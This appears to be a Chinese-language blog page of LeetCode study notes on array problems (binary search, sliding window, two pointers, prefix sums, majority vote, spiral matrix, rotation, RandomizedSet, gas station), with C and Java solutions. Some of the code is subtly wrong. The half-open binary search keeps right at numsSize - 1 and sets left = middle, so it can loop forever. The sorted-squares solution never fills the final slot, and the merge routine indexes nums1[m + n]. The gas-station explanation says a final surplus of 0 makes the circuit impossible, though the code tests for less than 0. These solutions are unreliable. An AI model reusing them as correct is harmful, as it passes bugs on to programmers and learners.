<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span> *nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> right = numsSize - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> middle = left + ((right - left) / <span class="number">2</span>);   <span class="comment">// 防止left+right溢出</span></span><br><span class="line">        <span class="keyword">if</span> (nums[middle] &gt; target)</span><br><span class="line">        &#123;</span><br><span class="line">            right = middle - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (nums[middle] &lt; target)</span><br><span class="line">        &#123;</span><br><span class="line">            left = middle + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> middle;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="左闭右开区间下的二分查找法"><a href="#左闭右开区间下的二分查找法" class="headerlink" title="左闭右开区间下的二分查找法"></a>左闭右开区间下的二分查找法</h4><p>有如下两点：</p>
<ul>
<li>while (left &lt; right)，这里使用 &lt; ,因为left &#x3D;&#x3D; right在区间[left, right)是没有意义的</li>
<li>if (nums[middle] &gt; target) right 更新为 middle，因为当前nums[middle]不等于target，去左区间继续寻找，而寻找区间是左闭右开区间，所以right更新为middle，即：下一个查询区间不会去比较nums[middle]</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span> *nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> right = numsSize - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> middle = left + ((right - left) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (nums[middle] &gt; target)</span><br><span class="line">        &#123;</span><br><span class="line">            right = middle;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (nums[middle] &lt; target)</span><br><span class="line">        &#123;</span><br><span class="line">            left = middle;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> middle;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="重要题解"><a href="#重要题解" class="headerlink" title="重要题解"></a>重要题解</h2><h3 id="二分法-704-二分查找法"><a href="#二分法-704-二分查找法" class="headerlink" title="(二分法) 704 二分查找法"></a>(二分法) 704 二分查找法</h3><h3 id="滑动窗口-209-长度最小子数组"><a href="#滑动窗口-209-长度最小子数组" class="headerlink" title="(滑动窗口) 209 长度最小子数组"></a>(滑动窗口) 209 长度最小子数组</h3><p>给定一个含有 n 个正整数的数组和一个正整数 target 。找出该数组中满足其总和大于等于 target 的长度最小的 子数组 [numsl, numsl+1, …, numsr-1, numsr] ，并返回其长度。如果不存在符合条件的子数组，返回 0 。</p>
<p>示例 1：<br>输入：target &#x3D; 7, nums &#x3D; [2,3,1,2,4,3]<br>输出：2</p>
<p>思路：</p>
<ol>
<li>暴力破解，复杂度O(n^2);</li>
<li>滑动窗口法，O(n);</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minSubArrayLen</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>; right &lt; nums.length; right++) &#123;</span><br><span class="line">            sum += nums[right];</span><br><span class="line">            <span class="keyword">while</span> (sum &gt;= target) &#123;</span><br><span class="line">                result = Math.min(result, right - left + <span class="number">1</span>);</span><br><span class="line">                sum -= nums[left++];</span><br><span class="line">                <span class="comment">// 窗口移动</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result == Integer.MAX_VALUE ? <span class="number">0</span> : result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="快慢双指针-27-移除元素"><a href="#快慢双指针-27-移除元素" class="headerlink" title="(快慢双指针) 27 移除元素"></a>(快慢双指针) 27 移除元素</h3><p>情景描述：<br>给你一个数组 nums 和一个值 val ，你需要<code>原地</code>移除所有数值等于<code>val</code>的元素，并返回移除后数组的新长度。<br>不要使用额外的数组空间，你必须仅使用<code>O(1)</code>额外空间并原地修改输入数组。<br>元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。</p>
<p>示例1:给定<code>nums</code>&#x3D; [3,2,2,3], val &#x3D; 3, 函数应该返回新的长度 2, 并且 nums 中的前两个元素均为 2。 你不需要考虑数组中超出新长度后面的元素。</p>
<p>思路：<strong>快慢指针或双向指针法</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 法1 双向指针法</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt; numsSize) &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[i] == val) &#123;</span><br><span class="line">        nums[i] = nums[--numsSize];  <span class="comment">// 用最后一个元素替换当前元素，并减少数组大小</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> numsSize;</span><br><span class="line"><span class="comment">// 法2 快慢指针</span></span><br><span class="line"><span class="type">int</span> slowIndex = <span class="number">0</span>, fastIndex;</span><br><span class="line"><span class="keyword">for</span> (fastIndex = <span class="number">0</span>; fastIndex &lt; numsSize; fastIndex++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (val != nums[fastIndex])</span><br><span class="line">    &#123;</span><br><span class="line">        nums[slowIndex++] = nums[fastIndex];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> slowIndex;</span><br><span class="line"><span class="comment">// 法3 快慢指针</span></span><br><span class="line"><span class="type">int</span> slowIndex = <span class="number">0</span>, fastIndex=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(fastIndex &lt; numsSize)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (val == nums[fastIndex])</span><br><span class="line">    &#123;</span><br><span class="line">        fastIndex++;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        nums[slowIndex++]=nums[fastIndex++];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> slowIndex;</span><br></pre></td></tr></table></figure>


<h3 id="前缀和-区间和"><a href="#前缀和-区间和" class="headerlink" title="(前缀和) 区间和"></a>(前缀和) 区间和</h3><p>给定一个整数数组 Array，输入时，第一行输入为整数数组 Array 的长度 n，接下来 n 行，每行一个整数，表示数组的元素。随后的输入为需要计算总和的区间，直至文件结束。要求输出每个指定区间内元素的总和。</p>
<p>示例：<br>5<br>4 \n 6 \n 7 \n 8 \n 9 \n<br>1 3<br>3 4<br>输出：<br>21<br>17</p>
<p>思路：<strong>计算数组区间和时可以使用前缀和</strong>首先计算第0位，第1位直到第n位的分别的和的数组，如上文，为：<br><code>SUM[5]=4,10,17,25,34</code>，计算区间和时只需要相减即可：sum(1~3) &#x3D; SUM[3]-SUM[0]&#x3D;25-4&#x3D;21;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">arraySum</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">    <span class="type">int</span>[] vec = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">    <span class="type">int</span>[] p = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">presum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        vec[i] = scanner.nextInt();</span><br><span class="line">        presum += vec[i];</span><br><span class="line">        p[i] = presum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (scanner.hasNextInt()) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> sum;</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="number">0</span>) &#123;</span><br><span class="line">            sum = p[b];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sum = p[b] - p[a - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    scanner.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="摩尔投票-查找多数元素"><a href="#摩尔投票-查找多数元素" class="headerlink" title="(摩尔投票) 查找多数元素"></a>(摩尔投票) 查找多数元素</h3><p>给定一个大小为 n 的数组 nums ，返回其中的多数元素。多数元素是指在数组中出现次数 大于 ⌊ n&#x2F;2 ⌋ 的元素<br>示例：[3,2,3]  &#x3D;&#x3D;&gt; 3</p>
<p>思路：采用摩尔投票法，候选人cand_num，初始票数为1，当相同时票数+1，不同时票数-1；当票数为0时更换候选人并重置票数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">majorityElement</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">cand_num</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cand_num == nums[i]) </span><br><span class="line">            ++count;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (--count == <span class="number">0</span>) &#123;</span><br><span class="line">            cand_num = nums[i];</span><br><span class="line">            count = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cand_num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="其他题解"><a href="#其他题解" class="headerlink" title="其他题解"></a>其他题解</h2><h3 id="快慢指针-80-去除重复元素II"><a href="#快慢指针-80-去除重复元素II" class="headerlink" title="(快慢指针) 80 去除重复元素II"></a>(快慢指针) 80 去除重复元素II</h3><p>给你一个有序数组 nums ，请你原地删除重复出现的元素，使得出现次数超过两次的元素只出现两次 ，返回删除后数组的新长度。<br>示例：<br>输入：nums &#x3D; [1,1,1,2,2,3]<br>输出：5, nums &#x3D; [1,1,2,2,3]</p>
<p>思路：因为本题要求相同元素最多出现两次而非一次，所以我们需要检查上上个应该被保留的元素 nums[slow−2] 是否和当前待检查元素nums[fast] 相同。快指针比慢指针快2个元素，即可跳过两次重复</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">removeDuplicates</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.length == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">slow</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">fast</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> (fast &lt; nums.length) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[slow - <span class="number">2</span>] != nums[fast]) &#123;</span><br><span class="line">            nums[slow++] = nums[fast];</span><br><span class="line">        &#125;</span><br><span class="line">        fast++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="双向指针-977-有序数组的平方"><a href="#双向指针-977-有序数组的平方" class="headerlink" title="(双向指针) 977 有序数组的平方"></a>(双向指针) 977 有序数组的平方</h3><p>给你一个按<code>非递减顺序</code>排序的整数数组nums，返回<code>每个数字的平方</code>组成的新数组，要求也按 <code>非递减顺序</code> 排序。</p>
<p>示例：<br>    输入：nums &#x3D; [-4,-1,0,3,10]<br>    输出：[0,1,9,16,100]<br>    解释：平方后，数组变为 [16,1,0,9,100]，排序后，数组变为 [0,1,9,16,100]</p>
<p>思路：</p>
<ol>
<li>暴力平方排序</li>
<li><code>双向指针法</code></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span>[] sortedSquares(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">    <span class="type">int</span>[] numbers = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = nums.length - <span class="number">1</span>, k = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] * nums[i] &lt; nums[j] * nums[j]) &#123;</span><br><span class="line">            numbers[k--] = nums[j]*nums[j--];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            numbers[k--] = nums[i]*nums[i++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> numbers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="逆向双指针-88-合并数组"><a href="#逆向双指针-88-合并数组" class="headerlink" title="(逆向双指针) 88 合并数组"></a>(逆向双指针) 88 合并数组</h3><p>给你两个按<code>非递减顺序</code>排列的整数数组<code>nums1</code>和<code>nums2</code>，另有两个整数<code>m</code>和<code>n</code>，分别表示<code>nums1</code>和<code>nums2</code>中的元素数目。请你合并<code>nums2</code>到<code>nums1</code>中，使合并后的数组同样按<code>非递减顺序</code>排列。<br>注意：最终，合并后数组不应由函数返回，而是存储在数组<code>nums1</code>中。为了应对这种情况，<code>nums1</code>的初始长度为<code>m</code>+<code>n</code>，其中前<code>m</code>个元素表示应合并的元素，后<code>n</code>个元素为<code>0</code>，应忽略。nums2<code>的长度为</code>n&#96;。</p>
<p>思路：</p>
<ol>
<li>先插入后快速排序</li>
<li>逆向双指针<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span>* nums1, <span class="type">int</span> nums1Size, <span class="type">int</span> m, <span class="type">int</span>* nums2, <span class="type">int</span> nums2Size, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (m + n) &#123;</span><br><span class="line">        <span class="keyword">if</span> (m &amp;&amp; n)</span><br><span class="line">            nums1[m + n] =</span><br><span class="line">                nums1[m - <span class="number">1</span>] &gt; nums2[n - <span class="number">1</span>] ? nums1[--m] : nums2[--n];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!m)</span><br><span class="line">            nums1[m + n] = nums2[-- n];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="行为模拟-59-螺旋矩阵II"><a href="#行为模拟-59-螺旋矩阵II" class="headerlink" title="(行为模拟) 59 螺旋矩阵II"></a>(行为模拟) 59 螺旋矩阵II</h3><p>给你一个正整数 n ，生成一个包含 1 到 n2 所有元素，且元素按顺时针顺序螺旋排列的 n x n 正方形矩阵 matrix 。<br>输入：n &#x3D; 3 输出：[[1,2,3],[8,9,4],[7,6,5]]</p>
<p>思路：重点是确定内循环边界和分清单次外循环的任务。可以将绕一圈视为一个整体的任务（外循环），内循环是应该采取左闭右开区间，即将最后一个交给下一次处理，如横向填充时最后一个元素应该竖向填充时才填补。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span>[][] generateMatrix(<span class="type">int</span> n) &#123;</span><br><span class="line">    <span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">    <span class="type">int</span> <span class="variable">startx</span> <span class="operator">=</span> <span class="number">0</span>, starty = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">loop</span> <span class="operator">=</span> <span class="number">1</span>, i, j, count = <span class="number">1</span>, offset = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (loop &lt;= n / <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = starty; j &lt; n - offset; j++) &#123;</span><br><span class="line">            arr[startx][j] = count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (i = startx; i &lt; n - offset; i++) &#123;</span><br><span class="line">            arr[i][j] = count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (j &gt; offset - <span class="number">1</span>) &#123;</span><br><span class="line">            arr[i][j--] = count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (i &gt; offset - <span class="number">1</span>) &#123;</span><br><span class="line">            arr[i--][j] = count++;</span><br><span class="line">        &#125;</span><br><span class="line">        loop++;</span><br><span class="line">        startx++;</span><br><span class="line">        starty++;</span><br><span class="line">        offset++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>) &#123; <span class="comment">// n 为奇数时，单独处理矩阵中心的值</span></span><br><span class="line">        arr[startx][startx] = count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="双指针-三次翻转-189-轮转数组"><a href="#双指针-三次翻转-189-轮转数组" class="headerlink" title="(双指针&#x2F;三次翻转) 189 轮转数组"></a>(双指针&#x2F;三次翻转) 189 轮转数组</h3><p>给定一个整数数组 nums，将数组中的元素向右轮转 k 个位置，其中 k 是非负数。</p>
<p>示例:<br>输入: nums &#x3D; [1,2,3,4,5,6,7], k &#x3D; 3<br>输出: [5,6,7,1,2,3,4]</p>
<p>思路：</p>
<ol>
<li>翻转数组法O(3n)：<ul>
<li>先将整体数组翻转：[7,6,5,4,3,2,1]</li>
<li>翻转前k个元素：[5,6,7,4,3,2,1]</li>
<li>翻转k+1~length-1个元素：[5,6,7,1,2,3,4]</li>
</ul>
</li>
<li>额外数组法：新数组的第(i+k)%length个元素为旧数组第i个元素</li>
<li>双指针法：快指针比慢指针快k个，需要k,length的最大公约数次循环，每次循环依次+k更新数据，直到回到起始点</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">rotate</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">    k = k % n; <span class="comment">// 令k&lt;length</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> gcd(k, n); <span class="comment">// count=k,n的最大公约数,表示需重复count次</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>; start &lt; count; ++start) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">current</span> <span class="operator">=</span> start; <span class="comment">// 位置current的元素会放至 next=(current+k)%n的位置</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">prev</span> <span class="operator">=</span> nums[start];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">next</span> <span class="operator">=</span> (current + k) % n;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[next];</span><br><span class="line">            nums[next] = prev; <span class="comment">// 完成next位置的更新</span></span><br><span class="line">            prev = temp;</span><br><span class="line">            current = next; <span class="comment">// 再从next位置重复操作</span></span><br><span class="line">        &#125; <span class="keyword">while</span> (start != current); <span class="comment">// start恒等于0，循环至初始位置0时中断本次while循环</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">gcd</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> y &gt; <span class="number">0</span> ? gcd(y, x % y) : x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="哈希表-集合-380-O-1-时间插入、删除和获取随机元素"><a href="#哈希表-集合-380-O-1-时间插入、删除和获取随机元素" class="headerlink" title="(哈希表&#x2F;集合)380 O(1) 时间插入、删除和获取随机元素"></a>(哈希表&#x2F;集合)380 O(1) 时间插入、删除和获取随机元素</h3><p>实现RandomizedSet 类：<br>RandomizedSet() 初始化 RandomizedSet 对象<br>bool insert(int val) 当元素 val 不存在时，向集合中插入该项，并返回 true ；否则，返回 false 。<br>bool remove(int val) 当元素 val 存在时，从集合中移除该项，并返回 true ；否则，返回 false 。<br>int getRandom() 随机返回现有集合中的一项（测试用例保证调用此方法时集合中至少存在一个元素）。每个元素应该有 相同的概率 被返回。你必须实现类的所有函数，并满足每个函数的 平均 时间复杂度为 O(1) 。</p>
<p>思路：变长数组可以在 O(1) 的时间内完成获取随机元素操作，但是由于无法在 O(1) 的时间内判断元素是否存在，因此不能在 O(1) 的时间内完成插入和删除操作。哈希表可以在 O(1) 的时间内完成插入和删除操作，但是由于无法根据下标定位到特定元素，因此不能在 O(1) 的时间内完成获取随机元素操作。为了满足插入、删除和获取随机元素操作的时间复杂度都是 O(1)，需要将变长数组和哈希表结合，变长数组中存储元素，哈希表中存储每个元素在变长数组中的下标。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; nums;</span><br><span class="line">Map&lt;Integer, Integer&gt; indices;</span><br><span class="line">Random random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">RandomizedSet</span><span class="params">()</span> &#123;</span><br><span class="line">    nums = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">    indices = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, Integer&gt;();</span><br><span class="line">    random = <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (indices.containsKey(val)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> nums.size();</span><br><span class="line">        nums.add(val);</span><br><span class="line">        indices.put(val, index);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">remove</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!indices.containsKey(val)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> indices.get(val);</span><br><span class="line">        <span class="type">int</span> <span class="variable">last</span> <span class="operator">=</span> nums.get(nums.size() - <span class="number">1</span>);</span><br><span class="line">        nums.set(index, last);</span><br><span class="line">        indices.put(last, index);</span><br><span class="line">        nums.remove(nums.size() - <span class="number">1</span>);</span><br><span class="line">        indices.remove(val);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getRandom</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">randomIndex</span> <span class="operator">=</span> random.nextInt(nums.size());</span><br><span class="line">    <span class="keyword">return</span> nums.get(randomIndex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="分析-贪心-134-加油站"><a href="#分析-贪心-134-加油站" class="headerlink" title="(分析&#x2F;贪心) 134 加油站"></a>(分析&#x2F;贪心) 134 加油站</h3><p>在一条环路上有 n 个加油站，其中第 i 个加油站有汽油 gas[i] 升。你有一辆油箱容量无限的的汽车，从第 i 个加油站开往第 i+1 个加油站需要消耗汽油 cost[i] 升。你从其中的一个加油站出发，开始时油箱为空。给定两个整数数组 gas 和 cost ，如果你可以按顺序绕环路行驶一周，则返回出发时加油站的编号，否则返回 -1 。如果存在解，则 保证 它是 唯一 的。</p>
<p>示例:<br>输入: gas &#x3D; [1,2,3,4,5], cost &#x3D; [3,4,5,1,2]<br>输出: 3</p>
<p>思路：从0开始，统计剩余的的油量，如果最后剩余的油量为0，那么必然无法绕圈。如果剩余油量大于0，则油量最低点的下一个站点即为可以选择的开始结点。</p>
<blockquote>
<p>当我们遍历到剩余油量的最低点时，意味着如果我们从该点之前的任何一个加油站出发，都无法保证到达该点时不耗尽油。但是，从该点之后（包括该点本身，如果剩余油量在此处已经非负）的某个加油站出发，我们可以确保到达该点时有足够的油，并且之后还能继续行驶直到环路结束.因此，如果我们找到了剩余油量的最低点，并且之后的剩余油量变为非负（或者该点本身就是非负的），那么从这个点的下一站（或该点本身，如果油量已经非负）出发，我们可以完成环路。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">canCompleteCircuit</span><span class="params">(<span class="type">int</span>[] gas, <span class="type">int</span>[] cost)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">spare</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">minSpare</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">    <span class="type">int</span> <span class="variable">minIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> gas.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="comment">// 累计剩余油量</span></span><br><span class="line">        spare += gas[i] - cost[i];</span><br><span class="line">        <span class="keyword">if</span> (spare &lt; minSpare) &#123;</span><br><span class="line">            <span class="comment">// 确定油量最低点</span></span><br><span class="line">            minSpare = spare;</span><br><span class="line">            minIndex = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 最终累计剩余油量&lt;0说明必不可绕圈。</span></span><br><span class="line">    <span class="keyword">return</span> spare &lt; <span class="number">0</span> ? -<span class="number">1</span> : (minIndex + <span class="number">1</span>) % len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


